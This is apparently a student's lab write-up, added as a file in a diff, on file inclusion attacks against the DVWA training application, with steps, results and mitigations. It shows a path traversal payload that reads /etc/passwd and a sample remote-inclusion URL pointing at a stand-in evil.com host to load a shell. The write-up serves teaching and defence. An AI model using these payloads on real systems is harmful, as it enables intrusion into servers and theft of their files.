@@ -1,0 +1,76 @@
+Task 4 – File Inclusion Attacks in DVWA
+🎯 Objective
+To understand and demonstrate Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities using DVWA.
+
+🛠 Tools Used
+Kali Linux
+DVWA (Damn Vulnerable Web Application)
+Web Browser (Firefox/Chromium)
+
+📌 What is File Inclusion?
+File Inclusion vulnerabilities happen when a website allows user input to decide which file to load.
+If not secured, attackers can:
+read sensitive files
+execute malicious code
+take control of the web server
+
+Types:
+Local File Inclusion (LFI) – load files from same server
+Remote File Inclusion (RFI) – load files from remote server (if enabled)
+
+🧭 Steps Performed
+✔ Step 1 – Open DVWA
+Logged in to DVWA successfully
+Navigated to File Inclusion module from left menu
+
+✔ Step 2 – Understand vulnerable parameter
+In the URL bar, DVWA uses:
+?page=<file>
+This parameter is vulnerable because user controls the filename.
+
+✔ Step 3 – Perform Local File Inclusion (LFI)
+Tried reading Linux password file using path traversal:
+?page=../../../../etc/passwd
+
+👉 Result:
+gained access to /etc/passwd
+confirmed LFI vulnerability
+
+✔ Step 4 – Explained Impact of LFI
+Through LFI, an attacker may:
+read configuration files
+read usernames
+find SSH keys
+escalate to Remote Code Execution in real systems
+
+✔ Step 5 – Tried Remote File Inclusion (RFI) (if enabled)
+Payload example (conceptual):
+?page=http://evil.com/shell.txt
+DVWA may block this depending on security level.
+
+🧪 Results & Observations
+DVWA is vulnerable to Local File Inclusion
+Sensitive files were accessed using directory traversal
+Application does not validate user input in page parameter
+RFI depends on PHP configuration (allow_url_include)
+
+🔐 Mitigation & Prevention:
+To prevent File Inclusion:
+Validate and whitelist filenames
+Disable allow_url_include in PHP
+Use absolute file paths instead of user input
+Implement input sanitization
+Apply least privilege to web server user
+
+✅ Conclusion
+Task 4 successfully demonstrated:
+Local File Inclusion (LFI) attack
+How attackers access sensitive files
+Security impact of improper input validation
+DVWA helps understand how real websites get compromised due to insecure file handling.
+
+🖼 Screenshot Checklist (what I used)
+DVWA Home page
+File Inclusion vulnerability page
+URL showing /etc/passwd traversal
+Output / blank page / error page
